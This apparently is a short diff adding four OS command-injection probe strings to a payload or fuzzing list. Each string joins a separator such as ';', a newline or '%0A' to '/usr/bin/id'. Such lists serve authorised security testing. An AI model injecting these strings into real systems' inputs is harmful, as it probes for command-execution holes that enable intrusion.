@@ -1,0 +1,4 @@
+; /usr/bin/id
+\n /usr/bin/id
+$;/usr/bin/id
+%0A/usr/bin/id%0A
